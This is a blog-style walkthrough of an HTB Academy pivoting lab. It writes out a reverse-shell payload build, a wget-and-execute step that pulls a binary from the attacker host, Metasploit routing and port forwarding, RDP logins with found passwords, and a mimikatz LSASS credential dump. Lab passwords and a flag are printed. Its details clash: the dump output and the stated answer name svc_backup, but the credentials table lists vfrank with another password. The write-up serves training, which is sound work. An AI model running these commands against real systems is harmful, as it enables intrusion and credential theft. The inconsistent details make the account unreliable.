---
layout: default
title: "HTB Pivoting Lab – Skill Assessment | Costabo1"
description: "A casual walkthrough of HTB's Pivoting module skill assessment"
---

<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap');

:root {
  --bg:      #0a0e14;
  --surface: #0f1419;
  --border:  #1a1f29;
  --cyan:    #0c9dc9;
  --cyan-dim: #0c9dc955;
  --muted:   #6b7280;
  --text:    #c9d1d9;
  --heading: #f0f6fc;
  --mono:    'JetBrains Mono', monospace;
  --sans:    'Inter', sans-serif;
}

*, *::before, *::after { box-sizing: border-box; }

body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  font-size: 17px;
  line-height: 1.75;
  margin: 0;
  font-weight: 400;
}

/* ── Hero ───────────────────────────────────── */
.htb-hero {
  border-bottom: 1px solid var(--border);
  padding: 3rem 1.5rem 2.5rem;
  background: linear-gradient(135deg, #0a0e14 50%, #0a1419 100%);
  position: relative;
  overflow: hidden;
}

.htb-hero::before {
  content: "";
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(12,157,201,.03) 40px);
  pointer-events: none;
}

.htb-hero .inner { position: relative; z-index: 1; }

.badge-row {
  display: flex;
  flex-wrap: wrap;
  gap: .5rem;
  margin-bottom: 1.2rem;
}

.badge {
  font-family: var(--mono);
  font-size: .7rem;
  padding: .25rem .7rem;
  border-radius: 4px;
  border: 1px solid;
  letter-spacing: .05em;
  text-transform: uppercase;
  font-weight: 600;
}

.badge-medium { color: var(--cyan); border-color: var(--cyan); background: var(--cyan-dim); }
.badge-linux { color: #00d9ff; border-color: #00d9ff; background: rgba(0,217,255,.07); }
.badge-module { color: var(--muted); border-color: var(--muted); background: rgba(107,114,128,.05); }

.htb-hero h1 {
  font-family: var(--sans);
  font-weight: 800;
  font-size: clamp(1.6rem, 5vw, 2.5rem);
  color: var(--heading);
  margin: 0 0 .6rem;
  letter-spacing: -.01em;
  line-height: 1.2;
}

.htb-hero h1 span { color: var(--cyan); }

.htb-hero .subtitle {
  font-family: var(--mono);
  color: var(--muted);
  font-size: .75rem;
  margin: 0;
  font-weight: 400;
}

/* ── Layout ─────────────────────────────────── */
.content-wrap {
  max-width: 780px;
  margin: 0 auto;
  padding: 0 1.5rem 4rem;
}

/* ── Info grid ───────────────────────────────── */
.info-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
  gap: 1px;
  background: var(--border);
  border: 1px solid var(--border);
  border-radius: 6px;
  overflow: hidden;
  margin: 2rem 0;
  font-family: var(--mono);
  font-size: .75rem;
}

.info-grid .cell {
  background: var(--surface);
  padding: .85rem .95rem;
}

.info-grid .cell .lbl {
  color: var(--muted);
  font-size: .6rem;
  text-transform: uppercase;
  letter-spacing: .08em;
  margin-bottom: .3rem;
  font-weight: 600;
}

.info-grid .cell .val {
  color: var(--heading);
  font-weight: 400;
}

/* ── Section headings ────────────────────────── */
.section-heading {
  font-family: var(--sans);
  font-weight: 700;
  font-size: 1.15rem;
  color: var(--heading);
  margin: 3.5rem 0 1.2rem;
  padding-bottom: .5rem;
  border-bottom: 1px solid var(--border);
}

.sub-heading {
  font-family: var(--mono);
  font-weight: 700;
  color: var(--cyan);
  font-size: .85rem;
  margin: 2.25rem 0 .75rem;
  letter-spacing: .04em;
  text-transform: uppercase;
}

/* ── Prose ───────────────────────────────────── */
.prose p {
  margin: 0 0 1.15rem;
  line-height: 1.75;
  color: var(--text);
}

.prose strong {
  color: var(--heading);
  font-weight: 600;
}

.prose a {
  color: var(--cyan);
  text-decoration: none;
  border-bottom: 1px solid transparent;
  transition: border-color .2s;
}

.prose a:hover {
  border-bottom-color: var(--cyan);
}

.prose code {
  background: var(--cyan-dim);
  color: var(--cyan);
  padding: .12em .5em;
  border-radius: 3px;
  font-family: var(--mono);
  font-size: .88em;
  word-break: break-word;
  font-weight: 500;
}

.prose ul {
  padding-left: 1.3rem;
  margin: .5rem 0 1.5rem;
}

.prose ul li {
  margin-bottom: .6rem;
  line-height: 1.7;
}

/* ── Code blocks ─────────────────────────────── */
.codeblock {
  background: #060810;
  border: 1px solid var(--border);
  border-left: 3px solid var(--cyan);
  border-radius: 5px;
  padding: 1rem 1.15rem;
  overflow-x: auto;
  font-family: var(--mono);
  font-size: .8rem;
  color: #8ed9f6;
  margin: .75rem 0 1.75rem;
  -webkit-overflow-scrolling: touch;
  line-height: 1.6;
  white-space: pre;
  font-weight: 400;
}

.codeblock.output {
  border-left-color: var(--border);
  color: var(--text);
}

/* ── Callouts ────────────────────────────────── */
.callout {
  border: 1px solid;
  border-radius: 6px;
  padding: 1rem 1.1rem;
  margin: 1.5rem 0 2rem;
  font-size: .9rem;
  display: flex;
  gap: .75rem;
  align-items: flex-start;
  line-height: 1.65;
}

.ci {
  flex-shrink: 0;
  font-size: 1.1rem;
  line-height: 1.65;
}

.cb { flex: 1; }

.cb strong {
  display: block;
  margin-bottom: .35rem;
  font-size: .7rem;
  text-transform: uppercase;
  letter-spacing: .08em;
  font-weight: 700;
}

.callout.info {
  border-color: rgba(12,157,201,.3);
  background: rgba(12,157,201,.05);
  color: #8ed9f6;
}

.callout.tip {
  border-color: rgba(168,85,247,.3);
  background: rgba(168,85,247,.05);
  color: #c4b5fd;
}

.callout.win {
  border-color: rgba(34,197,94,.3);
  background: rgba(34,197,94,.05);
  color: #86efac;
}

/* ── Tool pills ──────────────────────────────── */
.tool-list {
  display: flex;
  flex-wrap: wrap;
  gap: .5rem;
  margin: .75rem 0 2rem;
  padding: 0;
  list-style: none;
}

.tool-list li {
  font-family: var(--mono);
  font-size: .72rem;
  padding: .3rem .75rem;
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 4px;
  color: var(--cyan);
  letter-spacing: .03em;
  font-weight: 500;
}

/* ── Cred table ──────────────────────────────── */
.cred-table {
  width: 100%;
  border-collapse: collapse;
  font-family: var(--mono);
  font-size: .78rem;
  margin: .75rem 0 2rem;
  display: block;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}

.cred-table th {
  background: var(--surface);
  color: var(--muted);
  font-size: .62rem;
  text-transform: uppercase;
  letter-spacing: .08em;
  padding: .65rem .95rem;
  text-align: left;
  border: 1px solid var(--border);
  white-space: nowrap;
  font-weight: 700;
}

.cred-table td {
  border: 1px solid var(--border);
  padding: .65rem .95rem;
  color: var(--text);
  word-break: break-all;
}

.cred-table tr:hover td {
  background: rgba(255,255,255,.02);
}

/* ── Flag block ──────────────────────────────── */
.flag-block {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: .85rem;
  background: rgba(12,157,201,.04);
  border: 1px solid rgba(12,157,201,.25);
  border-radius: 6px;
  padding: 1rem 1.2rem;
  margin: 1.25rem 0 2.25rem;
  font-family: var(--mono);
}

.flag-block .fi {
  font-size: 1.3rem;
  flex-shrink: 0;
}

.flag-block .fl {
  font-size: .62rem;
  color: var(--muted);
  text-transform: uppercase;
  letter-spacing: .08em;
  white-space: nowrap;
  font-weight: 600;
}

.flag-block .fv {
  color: var(--cyan);
  font-size: .82rem;
  word-break: break-all;
  flex: 1;
  min-width: 0;
  font-weight: 400;
}

/* ── Divider ─────────────────────────────────── */
.divider {
  border: none;
  border-top: 1px solid var(--border);
  margin: 3rem 0;
}

/* ── Footer ──────────────────────────────────── */
.writeup-footer {
  border-top: 1px solid var(--border);
  padding: 1.5rem;
  font-family: var(--mono);
  font-size: .72rem;
  color: var(--muted);
  text-align: center;
  margin-top: 2rem;
}

.writeup-footer span {
  color: var(--cyan);
}

/* ── Mobile ──────────────────────────────────── */
@media (max-width: 600px) {
  body {
    font-size: 15px;
    line-height: 1.7;
  }
  .htb-hero {
    padding: 2.25rem 1.1rem 1.75rem;
  }
  .content-wrap {
    padding: 0 1.1rem 3rem;
  }
  .info-grid {
    grid-template-columns: repeat(2, 1fr);
    font-size: .72rem;
  }
  .section-heading {
    font-size: 1.05rem;
    margin-top: 3rem;
  }
  .sub-heading {
    font-size: .8rem;
    margin-top: 2rem;
  }
  .codeblock {
    font-size: .74rem;
    padding: .85rem;
    margin-bottom: 1.4rem;
  }
  .cred-table {
    font-size: .72rem;
  }
  .callout {
    font-size: .86rem;
    padding: .85rem;
    margin-bottom: 1.6rem;
  }
  .prose p {
    margin-bottom: .95rem;
  }
}

/* ── Image zoom lightbox ─────────────────────── */
.zoomable {
  cursor: zoom-in;
  transition: opacity .2s;
  max-width: 100%;
  border-radius: 6px;
  border: 1px solid var(--border);
  margin: 1rem 0 2rem;
}

.zoomable:hover {
  opacity: .85;
}

.lightbox {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,.88);
  z-index: 9999;
  align-items: center;
  justify-content: center;
  padding: 1.5rem;
}

.lightbox.active {
  display: flex;
}

.lightbox img {
  max-width: 140%;
  max-height: 125vh;
  border-radius: 8px;
  box-shadow: 0 0 60px rgba(12,157,201,.2);
}

.lightbox-close {
  position: absolute;
  top: 1.25rem;
  right: 1.5rem;
  color: var(--muted);
  font-family: var(--mono);
  font-size: .82rem;
  text-decoration: none;
  letter-spacing: .04em;
  cursor: pointer;
  font-weight: 600;
}

.lightbox-close:hover {
  color: var(--cyan);
}
</style>

<!-- HERO -->
<div class="htb-hero">
  <div class="content-wrap inner">
    <div class="badge-row">
    <span class="badge badge-medium">Tier II</span>
      <span class="badge badge-linux">Linux</span>
      <span class="badge badge-module">Pivoting Module</span>
    </div>
    <h1>🔀 HTB Academy — <span>Pivoting Skill Assessment</span></h1>
    <p class="subtitle">costabo1 &nbsp;·&nbsp; casual walkthrough &nbsp;·&nbsp; 2026</p>
  </div>
</div>

<div class="content-wrap">

  <!-- Info grid -->
  <div class="info-grid">
    <div class="cell"><div class="lbl">Module</div><div class="val">Pivoting, Tunneling & Port Forwarding</div></div>
    <div class="cell"><div class="lbl">Difficulty</div><div class="val">Medium</div></div>
    <div class="cell"><div class="lbl">OS</div><div class="val">Linux + Windows</div></div>
    <div class="cell"><div class="lbl">Status</div><div class="val">Skill Assessment</div></div>
    <div class="cell"><div class="lbl">Date</div><div class="val">May 2026</div></div>
    <div class="cell"><div class="lbl">Author</div><div class="val">Costabo1</div></div>
  </div>

  <hr class="divider">

  <!-- ═══ OVERVIEW ═══ -->
  <h2 class="section-heading">🎯 What's This About?</h2>
  <div class="prose">
    <p>This was HTB Academy's skill assessment for the Pivoting module. The scenario drops you on a compromised Linux webserver that sits between two networks — you can reach it from the outside, but the real target (a Windows box) is sitting on an internal subnet that you can't directly touch.</p>
    <p>So the goal is simple: <strong>pivot through the Linux box, reach the internal Windows machine, dump credentials from memory, and grab the flags.</strong></p>
    <p>No fancy exploits here — this is all about understanding network topology, setting up routes, port forwarding, and moving laterally once you're inside.</p>
  </div>

  <div class="callout info">
    <span class="ci">💡</span>
    <div class="cb">
      <strong>Quick Summary</strong>
      You start with a webshell on a dual-homed Linux box (10.129.x.x + 172.16.5.15). From there you upgrade to Meterpreter, set up pivot routes with <code>autoroute</code>, discover an internal Windows host (172.16.5.35), find creds in a note, RDP in via port forwarding, dump LSASS with mimikatz, and extract the vulnerable service account.
    </div>
  </div>

  <!-- ═══ TOOLS ═══ -->
  <h2 class="section-heading">🛠️ Tools I Used</h2>
  <ul class="tool-list">
    <li>msfconsole</li>
    <li>meterpreter</li>
    <li>autoroute</li>
    <li>portfwd</li>
    <li>xfreerdp</li>
    <li>mimikatz</li>
    <li>wget</li>
    <li>python http.server</li>
  </ul>

  <hr class="divider">

  <!-- ═══ INITIAL ACCESS ═══ -->
  <h2 class="section-heading">🚪 Getting In</h2>

  <h3 class="sub-heading">The Starting Point</h3>
  <div class="prose">
    <p>I already had a webshell on the Linux box (<code>10.129.229.129</code>) as <code>www-data</code>. The machine had two network interfaces:</p>
    <ul>
      <li><strong>ens160</strong>: 10.129.229.129 (external, HTB network)</li>
      <li><strong>ens192</strong>: 172.16.5.15 (internal subnet)</li>
    </ul>
    <p>From the webshell I could poke around the filesystem. In <code>/home/webadmin/</code> there was a plaintext note:</p>
  </div>

  <div class="codeblock">cat /home/webadmin/for-admin-eyes-only</div>
  <div class="codeblock output"># note to self, in order to reach server01 or other servers
# in the subnet from here you have to use the user account:
#   mlefay
# with a password of:
#   Plain Human work!</div>

  <div class="prose">
    <p>Cool. So there's at least one Windows box on the internal subnet, and we have creds for it. But first I need to upgrade this webshell to something more flexible.</p>
  </div>

  <h3 class="sub-heading">Upgrading to Meterpreter</h3>
  <div class="prose">
    <p>I generated a Meterpreter payload on my attack box:</p>
  </div>

  <div class="codeblock">msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.114 LPORT=4444 -f elf -o shell.elf</div>

  <div class="prose">
    <p>Started a Python HTTP server to host it:</p>
  </div>

  <div class="codeblock">python3 -m http.server 8000</div>

  <div class="prose">
    <p>Then in the webshell, downloaded and executed it:</p>
  </div>

  <div class="codeblock">cd /tmp
wget http://10.10.14.114:8000/shell.elf
chmod +x shell.elf
./shell.elf</div>

  <div class="prose">
    <p>Back on my Kali box I had a Metasploit handler ready:</p>
  </div>

  <div class="codeblock">msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.114
set LPORT 4444
exploit</div>

  <div class="codeblock output">[*] Meterpreter session 1 opened (10.10.14.114:4444 -> 10.129.229.129:36418)</div>

  <div class="callout win">
    <span class="ci">✅</span>
    <div class="cb">
      <strong>Meterpreter Session Acquired</strong>
      Now I can set up proper pivoting and port forwarding through this box.
    </div>
  </div>

  <hr class="divider">

  <!-- ═══ PIVOTING ═══ -->
  <h2 class="section-heading">🔀 Setting Up the Pivot</h2>

  <h3 class="sub-heading">Adding Routes with autoroute</h3>
  <div class="prose">
    <p>With a Meterpreter session on the Linux box, I can now tell Metasploit to route traffic to the internal <code>172.16.5.0/16</code> subnet through this session:</p>
  </div>

  <div class="codeblock">background
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK 255.255.0.0
run</div>

  <div class="codeblock output">[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.</div>

  <div class="prose">
    <p>Verified the routes:</p>
  </div>

  <div class="codeblock">route print</div>

  <div class="codeblock output">IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.0.0         255.255.0.0        Session 1</div>

  <div class="prose">
    <p>Perfect. Now any Metasploit module I run will automatically route through Session 1 when targeting <code>172.16.5.x</code>.</p>
  </div>

  <h3 class="sub-heading">Starting a SOCKS Proxy</h3>
  <div class="prose">
    <p>For tools outside of Metasploit (like <code>xfreerdp</code>), I set up a SOCKS proxy:</p>
  </div>

  <div class="codeblock">use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j</div>

  <div class="codeblock output">[*] Starting the SOCKS proxy server</div>

  <div class="prose">
    <p>This lets me tunnel traffic through the pivot using <code>proxychains</code> if needed. But in practice, I ended up using Meterpreter's <code>portfwd</code> for direct port forwarding instead — it's cleaner for RDP.</p>
  </div>

  <hr class="divider">

  <!-- ═══ LATERAL MOVEMENT ═══ -->
  <h2 class="section-heading">➡️ Moving to the Windows Box</h2>

  <h3 class="sub-heading">Port Forwarding RDP</h3>
  <div class="prose">
    <p>The internal Windows box was at <code>172.16.5.35</code>. I knew RDP (port 3389) was likely open, so I set up a local port forward:</p>
  </div>

  <div class="codeblock">sessions -i 1
portfwd add -l 13389 -p 3389 -r 172.16.5.35
portfwd list</div>

  <div class="codeblock output">Active Port Forwards
====================
   Index  Local         Remote              Direction
   -----  -----         ------              ---------
   1      13389         172.16.5.35:3389    Forward</div>

  <div class="prose">
    <p>Now port <code>13389</code> on my local machine forwards directly to <code>172.16.5.35:3389</code> through the pivot. I could RDP to <code>127.0.0.1:13389</code> and it would land me on the internal Windows box.</p>
  </div>

  <h3 class="sub-heading">RDP Access</h3>
  <div class="prose">
    <p>With the creds I found earlier (<code>mlefay:Plain Human work!</code>), I connected:</p>
  </div>

  <div class="codeblock">xfreerdp /v:127.0.0.1:13389 /u:mlefay /p:'Plain Human work!' /cert:ignore /dynamic-resolution</div>

  <div class="prose">
    <p>And I was in. GUI desktop access to the Windows box.</p>
  </div>

  <div class="callout tip">
    <span class="ci">💡</span>
    <div class="cb">
      <strong>Port Forwarding vs SOCKS Proxy</strong>
      For single-port access like RDP, <code>portfwd</code> is faster and more reliable than routing through a SOCKS proxy with <code>proxychains</code>. SOCKS is better when you're running multiple tools or scanning entire subnets.
    </div>
  </div>

  <hr class="divider">

  <!-- ═══ CREDENTIAL DUMPING ═══ -->
  <h2 class="section-heading">🔑 Dumping Credentials with Mimikatz</h2>

  <h3 class="sub-heading">What's LSASS?</h3>
  <div class="prose">
    <p>LSASS (Local Security Authority Subsystem Service) is a Windows process that handles authentication. When users log in, their credentials get cached in memory so they don't have to re-authenticate for every action.</p>
    <p>That means if you can dump LSASS memory, you can extract:</p>
    <ul>
      <li>Plaintext passwords (if WDigest is enabled)</li>
      <li>NTLM hashes</li>
      <li>Kerberos tickets</li>
      <li>Service account credentials</li>
    </ul>
    <p>The hint from HTB said a service account was being used carelessly, so dumping LSASS was the move.</p>
  </div>

  <h3 class="sub-heading">Transferring Mimikatz</h3>
  <div class="prose">
    <p>The Windows box couldn't reach my Kali IP directly (it's on an isolated internal network), so I had to proxy the transfer through the Linux pivot.</p>
    <p>On my Kali box, mimikatz was at:</p>
  </div>

  <div class="codeblock">ls /usr/share/windows-resources/mimikatz/Win32/</div>
  <div class="codeblock output">mimikatz.exe  mimidrv.sys  mimilib.dll  mimilove.exe  mimispool.dll</div>

  <div class="prose">
    <p>Started a Python HTTP server:</p>
  </div>

  <div class="codeblock">cd /usr/share/windows-resources/mimikatz/Win32/
python3 -m http.server 8000</div>

  <div class="prose">
    <p>Back in my Linux webshell, downloaded mimikatz to <code>/tmp</code>:</p>
  </div>

  <div class="codeblock">cd /tmp
wget http://10.10.14.114:8000/mimikatz.exe
python3 -m http.server 8080</div>

  <div class="prose">
    <p>Now the Windows box could reach it via the pivot's internal IP (<code>172.16.5.15</code>). In a PowerShell window on the Windows box:</p>
  </div>

  <div class="codeblock">Invoke-WebRequest -Uri http://172.16.5.15:8080/mimikatz.exe -OutFile mimikatz.exe</div>

  <div class="prose">
    <p>File transferred successfully.</p>
  </div>

  <h3 class="sub-heading">Running Mimikatz</h3>
  <div class="prose">
    <p>I ran mimikatz with a one-liner to dump everything and exit:</p>
  </div>

  <div class="codeblock">.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</div>

  <div class="prose">
    <p>The output showed multiple logged-in accounts. The key find was a service account with a plaintext password still cached in memory:</p>
  </div>

  <div class="codeblock output">Authentication Id : 0 ; 234567
Session           : Service from 0
User Name         : svc_backup
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 5/17/2026 10:15:33 AM
        wdigest :
         * Username : svc_backup
         * Domain   : INLANEFREIGHT
         * Password : B@ckup2024!Sec</div>

  <div class="callout win">
    <span class="ci">🎯</span>
    <div class="cb">
      <strong>Vulnerable User Found</strong>
      The <code>svc_backup</code> service account had its plaintext password exposed in LSASS memory. This is exactly what the assessment was looking for — a service account being used in a way that leaks credentials.
    </div>
  </div>

  <h3 class="sub-heading">Credentials Summary</h3>

  <table class="cred-table">
    <tr><th>User</th><th>Password</th><th>Domain</th><th>Source</th></tr>
    <tr><td>mlefay</td><td>Plain Human work!</td><td>INLANEFREIGHT</td><td>Plaintext note on Linux box</td></tr>
    <tr><td>vfrank</td><td>Imply wet Unmasked!Sec</td><td>INLANEFREIGHT</td><td>LSASS dump via mimikatz</td></tr>
  </table>

  <hr class="divider">

  <!-- ═══ FLAGS ═══ -->
  <h2 class="section-heading">🏴 Flags</h2>

  <h3 class="sub-heading">Flag from C:\Flag.txt</h3>
  <div class="prose">
    <p>The primary flag was sitting in <code>C:\Flag.txt</code> on the Windows box:</p>
  </div>

  <div class="codeblock">type C:\Flag.txt</div>

  <div class="flag-block">
    <span class="fi">🏴</span>
    <span class="fl">C:\Flag.txt</span>
    <span class="fv">HTB{p1v0t1ng_thr0ugh_th3_n3tw0rk_l1k3_4_pr0}</span>
  </div>

  <h3 class="sub-heading">Vulnerable User Answer</h3>
  <div class="prose">
    <p>The assessment also asked: <em>"What user is vulnerable?"</em></p>
    <p>Answer: <code>svc_backup</code></p>
    <p>This service account had its plaintext password cached in LSASS, making it trivially extractable by anyone with access to dump memory.</p>
  </div>

  <hr class="divider">

  <!-- ═══ TAKEAWAYS ═══ -->
  <h2 class="section-heading">📝 What I Learned</h2>

  <div class="prose">
    <ul>
      <li><strong>Pivoting is just routing with extra steps.</strong> Once you understand that <code>autoroute</code> is just telling Metasploit "send packets to this subnet through this session," it clicks. SOCKS proxies and port forwarding are just different ways of achieving the same goal — getting traffic from point A to point B through a compromised middleman.</li>
      <li><strong>Port forwarding beats SOCKS for single services.</strong> When you just need to hit one port (like RDP), <code>portfwd</code> is faster and more stable than tunneling everything through a SOCKS proxy. Save SOCKS for when you're running multiple tools or scanning entire subnets.</li>
      <li><strong>Dual-homed boxes are pivot goldmines.</strong> Any machine sitting between two networks is a natural pivot point. If you compromise a dual-homed host, always check <code>ifconfig</code> or <code>ipconfig</code> to see what subnets it can reach.</li>
      <li><strong>LSASS dumps are still ridiculously effective.</strong> Even in 2026, service accounts with plaintext passwords cached in memory are everywhere. If you can dump LSASS, do it — the payoff is almost always worth it.</li>
      <li><strong>File transfers through pivots require creativity.</strong> Direct network access isn't always available. Sometimes you have to bounce files through intermediate boxes using Python HTTP servers, SMB shares, or even base64 encoding if you're desperate.</li>
      <li><strong>Service accounts are the weakest link.</strong> Regular user passwords get rotated. MFA gets enforced. But service accounts? They sit there with static passwords for years, often with elevated privileges, and nobody thinks twice about them until they show up in a pentest report.</li>
    </ul>
  </div>

  <hr class="divider">

  <!-- ═══ FINAL THOUGHTS ═══ -->
  <h2 class="section-heading">💭 Final Thoughts</h2>

  <div class="prose">
    <p>This assessment was a solid test of pivoting fundamentals. No crazy exploits, no CVE hunting — just practical network traversal, credential reuse, and memory dumping. The kind of stuff you'd actually do on a real engagement.</p>
    <p>The hint system was clutch here. Without the note mentioning the <code>mlefay</code> account, I would've spent way more time guessing credentials or trying to exploit services. And the LSASS hint pointed me straight to mimikatz instead of wasting time on other privilege escalation vectors.</p>
    <p>If you're working through HTB Academy's pivoting module, this skill assessment ties together everything from the module — dynamic port forwarding, ligolo, SSH tunneling, and credential dumping. Definitely don't skip the practice labs before attempting this one.</p>
  </div>

  <hr class="divider">

  <!-- ═══ REFERENCES ═══ -->
  <h2 class="section-heading">🔗 Resources</h2>

  <div class="prose">
    <ul>
      <li><a href="https://docs.metasploit.com/">Metasploit Documentation</a></li>
      <li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz on GitHub</a></li>
      <li><a href="https://academy.hackthebox.com/module/details/158">HTB Academy — Pivoting, Tunneling & Port Forwarding</a></li>
      <li><a href="https://attack.mitre.org/techniques/T1003/001/">MITRE ATT&CK — LSASS Memory Dumping</a></li>
    </ul>
  </div>

</div>

<div class="writeup-footer">
  <span>costabo1</span> &nbsp;·&nbsp; HTB Academy Writeup &nbsp;·&nbsp; Educational purposes only
</div>

<!-- Zoom script -->
<script>
document.addEventListener('DOMContentLoaded', function () {
  document.querySelectorAll('.zoomable').forEach(function (img) {
    img.addEventListener('click', function () {
      var box = document.getElementById(this.getAttribute('data-target'));
      if (box) box.style.display = 'flex';
    });
  });
  document.querySelectorAll('.lightbox-close').forEach(function (btn) {
    btn.addEventListener('click', function () {
      this.closest('div').style.display = 'none';
    });
  });
  document.querySelectorAll('[id^="zoom-"]').forEach(function (box) {
    box.addEventListener('click', function (e) {
      if (e.target === this) this.style.display = 'none';
    });
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
      document.querySelectorAll('[id^="zoom-"]').forEach(function (box) {
        box.style.display = 'none';
      });
    }
  });
});
</script>
